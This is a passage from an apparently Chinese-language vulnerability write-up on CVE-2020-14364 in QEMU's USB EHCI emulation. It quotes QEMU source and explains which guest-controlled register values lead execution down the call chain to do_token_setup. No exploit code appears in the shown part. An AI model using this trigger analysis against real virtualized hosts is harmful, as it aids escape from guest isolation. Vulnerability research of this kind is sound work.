class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps ehci_mmio_opreg_ops = &#123;<br>    .read = ehci_opreg_read,<br>    .write = ehci_opreg_write,<br>    .valid.min_access_size = <span class="hljs-number">4</span>,<br>    .valid.max_access_size = <span class="hljs-number">4</span>,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps ehci_mmio_port_ops = &#123;<br>    .read = ehci_port_read,<br>    .write = ehci_port_write,<br>    .valid.min_access_size = <span class="hljs-number">4</span>,<br>    .valid.max_access_size = <span class="hljs-number">4</span>,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>这里主要关注<code>opreg</code>字段，而且主要用到了写回调函数，所以查看<code>ehci_opreg_write</code> 函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_opreg_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, hwaddr addr,</span><br><span class="hljs-params">                             <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    EHCIState *s = ptr;<br>    <span class="hljs-type">uint32_t</span> *mmio = s-&gt;opreg + (addr &gt;&gt; <span class="hljs-number">2</span>);<br>    <span class="hljs-type">uint32_t</span> old = *mmio;<br>    <span class="hljs-type">int</span> i;<br><br>    trace_usb_ehci_opreg_write(addr + s-&gt;opregbase, addr2str(addr), val);<br><br>    <span class="hljs-keyword">switch</span> (addr)<br>    &#123;<br>    <span class="hljs-keyword">case</span> USBCMD: <span class="hljs-comment">// 0x0</span><br>        <span class="hljs-keyword">if</span> (val &amp; USBCMD_HCRESET)<br>        &#123;<br>            ehci_reset(s);<br>            val = s-&gt;usbcmd;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/* not supporting dynamic frame list size at the moment */</span><br>        <span class="hljs-keyword">if</span> ((val &amp; USBCMD_FLS) &amp;&amp; !(s-&gt;usbcmd &amp; USBCMD_FLS))<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;attempt to set frame list size -- value %d\n&quot;</span>,<br>                    (<span class="hljs-type">int</span>)val &amp; USBCMD_FLS);<br>            val &amp;= ~USBCMD_FLS;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (val &amp; USBCMD_IAAD)<br>        &#123;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             * Process IAAD immediately, otherwise the Linux IAAD watchdog may</span><br><span class="hljs-comment">             * trigger and re-use a qh without us seeing the unlink.</span><br><span class="hljs-comment">             */</span><br>            s-&gt;async_stepdown = <span class="hljs-number">0</span>;<br>            qemu_bh_schedule(s-&gt;async_bh);<br>            trace_usb_ehci_doorbell_ring();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; val) !=<br>            ((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; s-&gt;usbcmd))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (s-&gt;pstate == EST_INACTIVE)<br>            &#123;<br>                SET_LAST_RUN_CLOCK(s);<br>            &#125;<br>            s-&gt;usbcmd = val; <span class="hljs-comment">/* Set usbcmd for ehci_update_halt() */</span><br>            ehci_update_halt(s);<br>            s-&gt;async_stepdown = <span class="hljs-number">0</span>;<br>            qemu_bh_schedule(s-&gt;async_bh);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> USBSTS:                   <span class="hljs-comment">// 4</span><br>        val &amp;= USBSTS_RO_MASK;     <span class="hljs-comment">// bits 6 through 31 are RO</span><br>        ehci_clear_usbsts(s, val); <span class="hljs-comment">// bits 0 through 5 are R/WC</span><br>        val = s-&gt;usbsts;<br>        ehci_update_irq(s);<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> USBINTR: <span class="hljs-comment">// 8</span><br>        val &amp;= USBINTR_MASK;<br>        <span class="hljs-keyword">if</span> (ehci_enabled(s) &amp;&amp; (USBSTS_FLR &amp; val))<br>        &#123;<br>            qemu_bh_schedule(s-&gt;async_bh);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> FRINDEX:          <span class="hljs-comment">// 0xC</span><br>        val &amp;= <span class="hljs-number">0x00003fff</span>; <span class="hljs-comment">/* frindex is 14bits */</span><br>        s-&gt;usbsts_frindex = val;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> CONFIGFLAG: <span class="hljs-comment">// 0x40</span><br>        val &amp;= <span class="hljs-number">0x1</span>;<br>        <span class="hljs-keyword">if</span> (val)<br>        &#123;<br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NB_PORTS; i++)<br>                handle_port_owner_write(s, i, <span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> PERIODICLISTBASE: <span class="hljs-comment">// 0x14</span><br>        <span class="hljs-keyword">if</span> (ehci_periodic_enabled(s))<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                    <span class="hljs-string">&quot;ehci: PERIODIC list base register set while periodic schedule\n&quot;</span><br>                    <span class="hljs-string">&quot;      is enabled and HC is enabled\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> ASYNCLISTADDR: <span class="hljs-comment">// 0x18</span><br>        <span class="hljs-keyword">if</span> (ehci_async_enabled(s))<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                    <span class="hljs-string">&quot;ehci: ASYNC list address register set while async schedule\n&quot;</span><br>                    <span class="hljs-string">&quot;      is enabled and HC is enabled\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    *mmio = val;<br>    trace_usb_ehci_opreg_change(addr + s-&gt;opregbase, addr2str(addr),<br>                                *mmio, old);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个函数通过传入的<code>addr</code> 判断跳入到哪个<code>switch</code>分支，然后为<code>EHCIState</code> 的<code>opreg</code> 字段赋值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint32_t</span> opreg[<span class="hljs-number">0x44</span> / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint32_t</span>)];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-type">uint32_t</span> usbcmd;<br>        <span class="hljs-type">uint32_t</span> usbsts;<br>        <span class="hljs-type">uint32_t</span> usbintr;<br>        <span class="hljs-type">uint32_t</span> frindex;<br>        <span class="hljs-type">uint32_t</span> ctrldssegment;<br>        <span class="hljs-type">uint32_t</span> periodiclistbase;<br>        <span class="hljs-type">uint32_t</span> asynclistaddr;<br>        <span class="hljs-type">uint32_t</span> notused[<span class="hljs-number">9</span>];<br>        <span class="hljs-type">uint32_t</span> configflag;<br>    &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure>



<h3 id="漏洞调用链"><a href="#漏洞调用链" class="headerlink" title="漏洞调用链"></a>漏洞调用链</h3><p>当触发到<code>do_token_setup</code> 函数时，函数调用链如下：</p>
<p><img src="/img/CVE-2020-14364/image-20240724225704740.png" srcset="/img/loading.gif" lazyload alt="image-20240724225704740"></p>
<p>简单梳理下可以得到如下格式的调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ehci_work_bh -&gt; ehci_advance_periodic_static -&gt; ehci_advance_state -&gt; ehci_state_execute -&gt; ehci_execute -&gt; usb_handle_packet -&gt; usb_process_one -&gt; do_token_setup<br></code></pre></td></tr></table></figure>

<p>让我们逐个查看如何触发到最终函数。</p>
<p><code>ehci_work_bh</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_work_bh</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    EHCIState *ehci = opaque;<br>    <span class="hljs-type">int</span> need_timer = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int64_t</span> expire_time, t_now;<br>    <span class="hljs-type">uint64_t</span> ns_elapsed;<br>    <span class="hljs-type">uint64_t</span> uframes, skipped_uframes;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (ehci-&gt;working)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    ehci-&gt;working = <span class="hljs-literal">true</span>;<br><br>    t_now = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);<br>    ns_elapsed = t_now - ehci-&gt;last_run_ns;<br>    uframes = ns_elapsed / UFRAME_TIMER_NS;<br><br>    <span class="hljs-keyword">if</span> (ehci_periodic_enabled(ehci) || ehci-&gt;pstate != EST_INACTIVE)<br>    &#123;<br>        need_timer++;<br><br>        <span class="hljs-keyword">if</span> (uframes &gt; (ehci-&gt;maxframes * <span class="hljs-number">8</span>))<br>        &#123;<br>            skipped_uframes = uframes - (ehci-&gt;maxframes * <span class="hljs-number">8</span>);<br>            ehci_update_frindex(ehci, skipped_uframes);<br>            ehci-&gt;last_run_ns += UFRAME_TIMER_NS * skipped_uframes;<br>            uframes -= skipped_uframes;<br>            DPRINTF(<span class="hljs-string">&quot;WARNING - EHCI skipped %d uframes\n&quot;</span>, skipped_uframes);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; uframes; i++)<br>        &#123;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             * If we&#x27;re running behind schedule, we should not catch up</span><br><span class="hljs-comment">             * too fast, as that will make some guests unhappy:</span><br><span class="hljs-comment">             * 1) We must process a minimum of MIN_UFR_PER_TICK frames,</span><br><span class="hljs-comment">             *    otherwise we will never catch up</span><br><span class="hljs-comment">             * 2) Process frames until the guest has requested an irq (IOC)</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">if</span> (i &gt;= MIN_UFR_PER_TICK)<br>            &#123;<br>                ehci_commit_irq(ehci);<br>                <span class="hljs-keyword">if</span> ((ehci-&gt;usbsts &amp; USBINTR_MASK) &amp; ehci-&gt;usbintr)<br>                &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (ehci-&gt;periodic_sched_active)<br>            &#123;<br>                ehci-&gt;periodic_sched_active--;<br>            &#125;<br>            ehci_update_frindex(ehci, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> ((ehci-&gt;frindex &amp; <span class="hljs-number">7</span>) == <span class="hljs-number">0</span>)<br>            &#123;<br>                ehci_advance_periodic_state(ehci);	<span class="hljs-comment">// &lt;--------</span><br>            &#125;<br>            ehci-&gt;last_run_ns += UFRAME_TIMER_NS;<br>        &#125;<br>    &#125;<br><br>   <span class="hljs-comment">// ...</span><br><br>    ehci-&gt;working = <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">ehci_periodic_enabled</span><span class="hljs-params">(EHCIState *s)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ehci_enabled(s) &amp;&amp; (s-&gt;usbcmd &amp; USBCMD_PSE);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">ehci_enabled</span><span class="hljs-params">(EHCIState *s)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> s-&gt;usbcmd &amp; USBCMD_RUNSTOP;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里我们看到，我们需要满足<code>ehci_periodic_enabled(ehci) || ehci-&gt;pstate != EST_INACTIVE</code> 为真，才能进入到<code>if</code>逻辑中。这里设置<code>s-&gt;usbcmd &amp; USBCMD_PSE == 1 &amp;&amp; s-&gt;usbcmd &amp; USBCMD_RUNSTOP == 1</code> 即可。<code>s-&gt;usbcmd</code> 属于<code>s-&gt;opreg</code>数组中，而数组中的字段是我们可控的。  之后需要满足<code>ehci-&gt;frindex &amp; 7 == 0</code>  ，这里直接设置<code>ehci-&gt;frindex</code> 为0即可。</p>
<p>总的来说，这个函数需要满足以下条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">s-&gt;usbcmd &amp; USBCMD_PSE == <span class="hljs-number">1</span> &amp;&amp; s-&gt;usbcmd &amp; USBCMD_RUNSTOP == <span class="hljs-number">1</span>;<br>ehci-&gt;frindex == <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p><code>ehci_advance_periodic_state</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_advance_periodic_state</span><span class="hljs-params">(EHCIState *ehci)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> entry;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-built_in">list</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> async = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 4.6</span><br><br>    <span class="hljs-keyword">switch</span> (ehci_get_state(ehci, async))<br>    &#123;<br>    <span class="hljs-keyword">case</span> EST_INACTIVE:<br>        <span class="hljs-keyword">if</span> (!(ehci-&gt;frindex &amp; <span class="hljs-number">7</span>) &amp;&amp; ehci_periodic_enabled(ehci))<br>        &#123;<br>            ehci_set_state(ehci, async, EST_ACTIVE);<br>            <span class="hljs-comment">// No break, fall through to ACTIVE</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">case</span> EST_ACTIVE:<br>        <span class="hljs-keyword">if</span> (!(ehci-&gt;frindex &amp; <span class="hljs-number">7</span>) &amp;&amp; !ehci_periodic_enabled(ehci))<br>        &#123;<br>            ehci_queues_rip_all(ehci, async);<br>            ehci_set_state(ehci, async, EST_INACTIVE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">list</span> = ehci-&gt;periodiclistbase &amp; <span class="hljs-number">0xfffff000</span>;<br>        <span class="hljs-comment">/* check that register has been set */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">list</span> == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-built_in">list</span> |= ((ehci-&gt;frindex &amp; <span class="hljs-number">0x1ff8</span>) &gt;&gt; <span class="hljs-number">1</span>);<br><br>        <span class="hljs-keyword">if</span> (get_dwords(ehci, <span class="hljs-built_in">list</span>, &amp;entry, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        DPRINTF(<span class="hljs-string">&quot;PERIODIC state adv fr=%d.  [%08X] -&gt; %08X\n&quot;</span>,<br>                ehci-&gt;frindex / <span class="hljs-number">8</span>, <span class="hljs-built_in">list</span>, entry);<br>        ehci_set_fetch_addr(ehci, async, entry);<br>        ehci_set_state(ehci, async, EST_FETCHENTRY);<br>        ehci_advance_state(ehci, async);	<span class="hljs-comment">// &lt;-------</span><br>        ehci_queues_rip_unused(ehci, async);<br>        <span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-comment">/* this should only be due to a developer mistake */</span><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ehci: Bad periodic state %d. &quot;</span><br>                        <span class="hljs-string">&quot;Resetting to active\n&quot;</span>,<br>                ehci-&gt;pstate);<br>        g_assert_not_reached();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/* Get an array of dwords from main memory */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">get_dwords</span><span class="hljs-params">(EHCIState *ehci, <span class="hljs-type">uint32_t</span> addr,</span><br><span class="hljs-params">                             <span class="hljs-type">uint32_t</span> *buf, <span class="hljs-type">int</span> num)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (!ehci-&gt;as)<br>    &#123;<br>        ehci_raise_irq(ehci, USBSTS_HSE);<br>        ehci-&gt;usbcmd &amp;= ~USBCMD_RUNSTOP;<br>        trace_usb_ehci_dma_error();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; num; i++, buf++, addr += <span class="hljs-keyword">sizeof</span>(*buf))<br>    &#123;<br>        dma_memory_read(ehci-&gt;as, addr, buf, <span class="hljs-keyword">sizeof</span>(*buf));<br>        *buf = le32_to_cpu(*buf);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> num;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>这里通过调试，可以发现总是走<code>EST_ACTIVE</code> 这个分支，<code>if</code> 判断由上述分析可知也是不会步入的。然后通过<code>ehci-&gt;periodiclistbase</code>字段设置变量<code>list</code> ，并获取<code>list</code> 地址内容到变量<code>entry</code> 中，也即<code>*list = entry</code> 。然后设置<code>ehci-&gt;p_fetch_addr = entry</code>。</p>
<p>这里通过控制<code>ehci-&gt;periodiclistbase</code> 字段地址内容即可控制<code>ehci-&gt;p_fetch_addr</code> 字段。</p>
<p><code>ehci_advance_state</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This is the state machine that is common to both async and periodic</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_advance_state</span><span class="hljs-params">(EHCIState *ehci, <span class="hljs-type">int</span> async)</span><br>&#123;<br>    EHCIQueue *q = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> itd_count = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> again;<br><br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-keyword">switch</span> (ehci_get_state(ehci, async))<br>        &#123;<br>        <span class="hljs-keyword">case</span> EST_WAITLISTHEAD:<br>            again = ehci_state_waitlisthead(ehci, async);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EST_FETCHENTRY:<br>            again = ehci_state_fetchentry(ehci, async);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EST_FETCHQH:<br>            q = ehci_state_fetchqh(ehci, async);<br>            <span class="hljs-keyword">if</span> (q != <span class="hljs-literal">NULL</span>)<br>            &#123;<br>                assert(q-&gt;async == async);<br>                again = <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                again = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EST_FETCHITD:<br>            again = ehci_state_fetchitd(ehci, async);<br>            itd_count++;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EST_FETCHSITD:<br>            again = ehci_state_fetchsitd(ehci, async);<br>            itd_count++;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> 